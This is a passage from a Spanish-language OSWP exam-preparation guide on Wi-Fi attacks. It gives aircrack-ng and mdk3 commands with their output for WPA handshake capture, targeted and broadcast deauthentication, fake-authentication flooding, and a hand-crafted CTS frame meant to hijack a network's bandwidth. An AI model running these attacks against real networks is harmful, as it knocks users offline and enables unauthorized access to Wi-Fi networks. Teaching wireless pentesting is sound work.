<li>airodump-ng -c 1 -w Captura --essid hacklab wlan0mon</li> <li>airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 wlan0mon</li> <li>airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon</li> </ul> <p>De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de trabajo:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #ls\nCaptura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv\n</code></pre> <p>Realmente, de todos estos ficheros, con el que la gran mayor\u00eda de veces trabajaremos es con el que tiene extensi\u00f3n '.cap', esto es as\u00ed dando que es el que contendr\u00e1 el ** Handshake** capturado, con el que trataremos en breve.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#concepto-de-handshake","title":"Concepto de Handshake","text":"<p>Por cada vez que una estaci\u00f3n se asocia o re-asocia a un AP, durante el proceso de asociaci\u00f3n viaja la contrase\u00f1a del AP encriptada. A efectos pr\u00e1cticos, se dice siempre que el Handshake en estos casos se genera en el momento en el que un cliente se re-conecta a la red. </p> <p>Como estamos monitorizando todo el tr\u00e1fico de la red en un fichero... viene de maravilla capturar una re-asociaci\u00f3n, pues esta autenticaci\u00f3n dejar\u00e1 rastro en nuestra captura y seremos capaces de visualizar la contrase\u00f1a encriptada de la red.</p> <p>Podr\u00edas pensar, \u00bfentonces tengo que quedarme esperando hasta que por X raz\u00f3n una estaci\u00f3n se re-asocie al AP?, no exactamente. Ese tipo de escenario se le considerar\u00eda escenario pasivo, pues nosotros como atacantes no estar\u00edamos interviniendo para manipular el tr\u00e1fico del AP. </p> <p>Existe un escenario activo, el cual pondremos en pr\u00e1ctica, donde como atacantes somos capaces de elaborar externamente sin estar asociados a un AP, un ataque de de-autenticaci\u00f3n, consiguiendo as\u00ed expulsar a uno o m\u00faltiples clientes de una red inal\u00e1mbrica sin consentimiento.</p> <p>Un Handshake al fin y al cabo quedar\u00e1 marcado como un Hash, el cual podremos extraer de la captura posteriormente para iniciar un ataque de fuerza bruta.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tecnicas-para-capturar-un-handshake","title":"T\u00e9cnicas para capturar un Handshake","text":"<p>A continuaci\u00f3n, se representan distintas t\u00e9cnicas con el prop\u00f3sito de capturar un Handshake de la red fijada como objetivo.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-de-deautenticacion-dirigido","title":"Ataque de deautenticaci\u00f3n dirigido","text":"<p>El protocolo IEEE 802.11 (Wi-Fi), contiene la provisi\u00f3n para un marco de deautenticaci\u00f3n. Como atacantes, para este ataque lo que haremos ser\u00e1 enviar un marco de deautenticaci\u00f3n al punto de acceso inal\u00e1mbrico objetivo, especificando la direcci\u00f3n MAC del cliente que queremos que sea expulsado de la red.</p> <p>El proceso de enviar dicho marco al punto de acceso se denomina 'T\u00e9cnica autorizada para informar a una estaci\u00f3n no autorizada que se ha desconectado de la red'.</p> <p>En otras palabras, estar\u00edamos poniendo en pr\u00e1ctica el siguiente esquema:</p> <p></p> <p>Para retomar la captura por donde lo hab\u00edamos dejado, os vuelvo a representar el caso:</p> <pre><code> CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 \n</code></pre> <p>Por tanto, tenemos un cliente 34:41:5D:46:D1:38 asociado al AP hacklab. Tratemos de expulsarlo del punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de aireplay-ng.</p> <p>'Aireplay-ng' cuenta con diferentes modos:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\\s*$/d' | sed 's/^ *//'; echo\n\n--deauth      count : deauthenticate 1 or all stations (-0)\n--fakeauth    delay : fake authentication with AP (-1)\n--interactive       : interactive frame selection (-2)\n--arpreplay         : standard ARP-request replay (-3)\n--chopchop          : decrypt/chopchop WEP packet (-4)\n--fragment          : generates valid keystream   (-5)\n--caffe-latte       : query a client for new IVs  (-6)\n--cfrag             : fragments against a client  (-7)\n--migmode           : attacks WPA migration mode  (-8)\n--test              : tests injection and quality (-9)\n</code></pre> <p>Para este caso, nos interesa el par\u00e1metro '-0', el cual tambi\u00e9n puede ser usado con el par\u00e1metro '--deauth'.</p> <p>La sintaxis ser\u00eda la siguiente:</p> <ul> <li>aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon</li> </ul> <p>CONSIDERACIONES: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no hacerlo, es probable que el ataque de deautenticaci\u00f3n no funcione, pues aireplay no sabe sobre qu\u00e9 canal operar.</p> <p>Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes de de-autenticaci\u00f3n a la estaci\u00f3n objetivo, haciendo as\u00ed que esta se desasocie de la red. Al igual que se han especificado 10 paquetes, su valor puede incrementarse al valor deseado. </p> <p>Es posible incluso especificar un valor '0', haci\u00e9ndole saber as\u00ed a aireplay que queremos enviar un n\u00famero infinito/ilimitado de paquetes de deautenticaci\u00f3n a la estaci\u00f3n objetivo:</p> <ul> <li>aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon</li> </ul> <p>Esto mismo lo podr\u00edamos haber hecho especificando la direcci\u00f3n MAC del AP en vez de su ESSID:</p> <ul> <li>aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon</li> </ul> <p>Obteniendo los siguientes resultados:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon\n20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1\n20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]\n20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]\n20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]\n20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]\n20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]\n20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]\n20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]\n20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]\n20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]\n20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]\n</code></pre> <p>Ahora bien, para saber si nuestros paquetes est\u00e1n surtiendo efecto sobre la estaci\u00f3n, el truco est\u00e1 en contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '[18|65 ACks]'. Siempre que este sea mayor que 0, ello querr\u00e1 decir que nuestros paquetes est\u00e1n siendo enviados correctamente a la estaci\u00f3n.</p> <p>Si haces estas practicas en local, podr\u00e1s comprobar c\u00f3mo tu dispositivo en caso de haber sido la estaci\u00f3n v\u00edctima, habr\u00eda sido desconectado del AP. Por otro lado, aunque lo veremos m\u00e1s adelante, imaginemos que ahora paramos el ataque, \u00bfqu\u00e9 cre\u00e9is que pasar\u00eda?. Fijaros que en la mayor\u00eda de las veces, los dispositivos tienden a recordar los puntos de acceso a los que alguna vez han estado conectados. </p> <p>Esto es as\u00ed debido a los paquetes Probe Request:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2&gt;/dev/null\n   49 1.516614496 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  242 9.119006178 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  473 17.062963738 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  487 17.411192451 HonHaiPr_17:91:c0 \u2192 Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  511 18.533411763 IntelCor_46:d1:38 \u2192 Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab\n  512 18.552100778 IntelCor_46:d1:38 \u2192 Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab\n  513 18.556049394 IntelCor_46:d1:38 \u2192 Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  515 18.649006729 Google_71:cf:8c \u2192 Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  516 18.650498757 Google_71:cf:8c \u2192 Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12\n  517 18.669117644 Google_71:cf:8c \u2192 Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n  518 18.670480133 Google_71:cf:8c \u2192 Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12\n  519 18.691337428 Google_71:cf:8c \u2192 Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)\n</code></pre> <p>Y es justamente aqu\u00ed donde est\u00e1 la gracia, pues de parar el ataque, el dispositivo lo que de manera autom\u00e1tica har\u00e1 ser\u00e1 reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generar\u00e1 el Handshake:</p> <pre><code> CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     \n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab\n ```\n\n Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la direcci\u00f3n\n MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y\n que se acaba de reasociar.\n\n Jugaremos con el Handshake m\u00e1s adelante, veamos primero otras formas de obtener el Handshake.\n\n #### Ataque de deautenticaci\u00f3n global\n\n Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio\n establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es m\u00e1s factible lanzar\n otro tipo de ataque, el **ataque de deautenticaci\u00f3n global**.\n\n A diferencia del ataque de deautenticaci\u00f3n dirigido, en el ataque de deautenticaci\u00f3n global, se hace uso de\n una **Broadcast MAC Address** como direcci\u00f3n MAC de estaci\u00f3n objetivo a utilizar. Lo que conseguimos con esta\n direcci\u00f3n MAC, es expulsar a todos los clientes que se encuentren asociados el AP.\n\n Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor\n no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede\n ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estaci\u00f3n). En vez de estar por tanto\n deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como\n para que capturemos un Handshake, resulta m\u00e1s c\u00f3modo expulsarlos a todos.\n\n Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake v\u00e1lido. Hay que tener en\n cuenta que es posible capturar m\u00faltiples Handshakes por parte de distintas estaciones en un mismo AP, pero\n esto no supone ning\u00fan problema.\n\n El ataque se puede elaborar de 2 formas, una es la siguiente:\n\n * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon\n\nObteniendo los siguientes resultados:\n\n ```bash\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon\n21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12\nFound BSSID \"20:34:FB:B1:C5:53\" to given ESSID \"hacklab\".\n21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]\n21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]\n21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]\n21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]\n ```\n\nY la otra sin especificar ninguna direcci\u00f3n MAC, lo que por defecto la suite interpretar\u00e1 como un ataque de\ndeautenticaci\u00f3n global:\n\n* aireplay-ng -0 0 -e hacklab wlan0mon\n\nObteniendo estos resultados:\n\n```bash\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #aireplay-ng -0 10 -e hacklab wlan0mon\n21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12\nFound BSSID \"20:34:FB:B1:C5:53\" to given ESSID \"hacklab\".\nNB: this attack is more effective when targeting\na connected wireless client (-c &lt;client's mac&gt;).\n21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-de-autenticacion","title":"Ataque de autenticaci\u00f3n","text":"<p>Puede sonar raro, pero tambi\u00e9n existe un ataque llamado ataque de autenticaci\u00f3n o asociaci\u00f3n. A trav\u00e9s de este ataque, en vez de expulsar a clientes de una red, lo que hacemos es a\u00f1adirlos.</p> <p>Te preguntar\u00e1s, \u00bfy qu\u00e9 consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. </p> <p>\u00bfQu\u00e9 crees que pasar\u00eda si en una red inyectamos 5.000 clientes?, exacto, por ah\u00ed van los tiros. Si una red dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notar\u00edamos de hacerlo en local que la red comenzar\u00eda a ir lenta, llegando al punto en el que ser\u00edamos expulsados de esta hasta detener el ataque.</p> <p>Inyectar a un cliente es bastante sencillo, lo hacemos a trav\u00e9s del par\u00e1metro '-1' de aireplay:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #echo; aireplay-ng --help | tail -n 13 | grep \"\\-1\" | sed '/^\\s*$/d' | sed 's/^ *//'; echo\n\n--fakeauth    delay : fake authentication with AP (-1)\n</code></pre> <p>Imaginemos que tenemos este escenario:</p> <pre><code> CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     \n (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                \n</code></pre> <p>Veamos c\u00f3mo podr\u00edamos por ejemplo llevar a cabo una falsa autenticaci\u00f3n haciendo uso de nuestra tarjeta de red como estaci\u00f3n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon\n21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6\nFound BSSID \"1C:B0:44:D4:16:78\" to given ESSID \"MOVISTAR_1677\".\n\n21:20:28  Sending Authentication Request (Open System) [ACK]\n21:20:28  Authentication successful\n21:20:28  Sending Association Request\n\n21:20:33  Sending Authentication Request (Open System) [ACK]\n21:20:33  Authentication successful\n21:20:33  Sending Association Request\n\n21:20:38  Sending Authentication Request (Open System) [ACK]\n21:20:38  Authentication successful\n21:20:38  Sending Association Request [ACK]\n21:20:38  Association successful :-) (AID: 1)\n</code></pre> <p>Con el par\u00e1metro '-h', especificamos la direcci\u00f3n MAC del falso cliente a autenticar. Si volvemos a analizar ahora la red inal\u00e1mbrica, podremos ver que nuestra tarjeta de red figura como cliente:</p> <pre><code> CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             \n\n (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     \n (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     \n 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         \n</code></pre> <p>Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda gracia, estar\u00edamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es enga\u00f1ar al router, haci\u00e9ndole creer que dispone de ese cliente asociado.</p> <p>A efectos pr\u00e1cticos, por el momento esto no genera ning\u00fan inconveniente, \u00bfc\u00f3mo autenticamos por tanto ahora a 5.000 clientes?. Podr\u00edamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, mdk3.</p> <p>A trav\u00e9s de la utilidad mdk3, tenemos un modo de ataque 'Authentication DoS Mode' que se encarga de asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:</p> <ul> <li>mdk3 wlan0mon a -a bssidAP</li> </ul> <p>Ve\u00e1moslo en la pr\u00e1ctica, aplicamos el comando por un lado:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Direcci\u00f3n MAC del AP hacklab\n</code></pre> <p>Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:</p> <pre><code> CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Probe               \n\n (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       \n 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       \n 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       \n 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      \n</code></pre> <p>Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a los clientes m\u00e1s lejanos o con poca se\u00f1al WiFi.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cts-frame-attack","title":"CTS Frame Attack","text":"<p>Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inal\u00e1mbrica durante un largo per\u00edodo de tiempo, aunque paremos el ataque.</p> <p>Lo que haremos ser\u00e1 abrir Wireshark por un lado, capturando paquetes de tipo CTS (Clear-To-Send):</p> <p></p> <p>Recomiendo investigar sobre este tipo de paquetes junto al RTS, tienen una historia muy bonita frente al problema del nodo oculto, evitando las famosas colisiones de trama.</p> <p>Un paquete CTS dispone generalmente de 4 campos:</p> <ul> <li>Frame Control</li> <li>Duraci\u00f3n</li> <li>RA (Direcci\u00f3n del Receptor)</li> <li>FCS</li> </ul> <p>El campo del tiempo para dicho paquete puede ser visto r\u00e1pidamente desde Wireshark (304 microsegundos):</p> <p></p> <p>Lo que haremos una vez dispongamos de un paquete CTS, ser\u00e1 exportar dicho paquete en un formato 'Wireshark/tcpdump/... -pcap':</p> <p></p> <p>Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:</p> <p></p> <p>Una vez llegados a este punto, en mi caso har\u00e9 uso de la herramienta 'ghex' para abrir la captura con un editor hexadecimal:</p> <p></p> <p>En esta parte es importante hacer la siguiente distinci\u00f3n:</p> <ul> <li> <p>Los \u00faltimos 4 valores: 11 D1 13 85 corresponden al FCS, deber\u00e1n ser computados por cada variaci\u00f3n que   hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello... ya que nos lo dar\u00e1 el propio   Wireshark :)</p> </li> <li> <p>Los 6 valores anteriores al FCS: 30 45 96 BF 9D 2C, corresponden a la direcci\u00f3n MAC del router. Obviamente, este valor deber\u00e1 de ser cambiado al deseado.</p> </li> <li> <p>Los 2 valores anteriores al FCS: 30 01, corresponden al tiempo en microsegundos puesto en hexadecimal y   Little Endian.</p> </li> </ul> <p>Para el \u00faltimo punto, por si han habido confusiones:</p> <p></p> <p>Ah\u00ed vemos que corresponden a los 304 microsegundos. Ahora bien, aqu\u00ed es donde viene el vector de ataque, vamos a ver cu\u00e1l ser\u00eda el valor en hexadecimal del valor tope permitido (30.000 microsegundos):</p> <p></p> <p>Tratemos desde ghex de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su representaci\u00f3n en hexadecimal y Little Endian:</p> <p></p> <p>CONSIDERACI\u00d3N: Tambi\u00e9n he especificado la direcci\u00f3n MAC del AP objetivo en ghex (64:D1:54:88:BA:3C)</p> <p>Podr\u00edamos pensar que es as\u00ed de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el valor del FCS, pues de lo contrario el paquete es inv\u00e1lido. Uno puede optar por comerse la cabeza y tratar de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde Wireshark:</p> <p></p> <p>Como vemos, es una maravilla, dado que ya el propio Wireshark nos da el valor del FCS que necesitamos para la captura manipulada. </p> <p>Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, tambi\u00e9n se aplica para este caso):</p> <p></p> <p>Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:</p> <p></p> <p>Esto son buenas noticias, pues no nos sale ning\u00fan tipo de error, \u00a1hemos construido un paquete v\u00e1lido!.</p> <p>Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:</p> <p></p> <p>Como vemos, se han tramitado un total de 10.000 paquetes de tipo CTS con un tiempo total de 30.000 microsegundos para cada uno. Encima le hemos a\u00f1adido el par\u00e1metro '--topspeed' para evitar que el siguiente paquete se envi\u00e9 una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.</p> <p>Por aqu\u00ed podemos ver los valores de cada uno de estos paquetes enviados:</p> <p></p> <p>\u00bfResultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente inoperativa durante un largo per\u00edodo de tiempo. No recomiendo hacer el ataque en nuestra propia red.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#beacon-flood-mode-attack","title":"Beacon Flood Mode Attack","text":"<p>Un beacon es un paquete que contiene informaci\u00f3n sobre el punto de acceso, como por ejemplo, en qu\u00e9 canal se encuentra, qu\u00e9 tipo de cifrado lleva, c\u00f3mo se llama la red, etc.</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==0x8\" 2&gt;/dev/null\n    1 0.000000000 AskeyCom_d4:16:78 \u2192 Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, 